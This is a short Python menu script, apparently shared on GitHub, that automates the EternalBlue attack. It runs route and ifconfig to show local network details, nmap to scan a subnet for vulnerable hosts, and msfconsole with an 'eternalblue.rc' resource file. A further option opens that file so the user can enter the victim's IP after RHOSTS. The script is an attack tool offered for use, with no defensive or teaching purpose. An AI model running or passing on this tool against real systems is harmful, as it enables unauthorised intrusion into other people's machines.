from pyfiglet import Figlet
import subprocess
import random
import time
custom_fig = Figlet(font='big')
print(custom_fig.renderText('Et3rn4lBlu3')), 

print('byTheRedPch')
print('https://github.com/theRedpch')
print("")
print("")
print('------------------------------------')
print('[1]' 'Saber ip')
print('[2]' 'Escanear red para vulnerabilidades')
print('[3]' 'Ejecutar exploit metasploit (modificar RHOSTS de "eternalblue.rc")')
print('[4]' 'Modificar archivo "eternalblue.rc")')
print('------------------------------------')

select = int(input('Escriba la opcion que desea utilizar: '))

if select == 1:
	subprocess.run(['route'])
	subprocess.run(['ifconfig'])	
	
if select ==2:
	ip = input('Escriba la direccion ip del router para escanear (añadir "/24" al final): ')
	print('Ejecutando Nmap...')
	print(chr(27)+"[1;33m"+"Ejecutando Nmap...")
	subprocess.run(['nmap', ip ])
	print(' SI NO FUNCIONA 	AÑADA "-Pn" tras la ip Ex: 0.0.0.0. -Pn')

	
if select ==3:

	print('')
	print('')
	eternalblue = input('Escriba el directorio junto al nombre del archivo "eternalblue.rc", Ex: "/Descargas/Eternalblue.rc" ')
	subprocess.run(['msfconsole', '-r', eternalblue, ])

if select ==4:
	eternalblue = input('Escriba el directorio junto al nombre del archivo "eternalblue.rc", Ex: "/Descargas/Eternalblue.rc" ')
	print('Poner Ip de la maquina victima despues de RHOSTS')
	subprocess.run(['nano', eternalblue])

if select >=5:
	print('Opcion no valida')


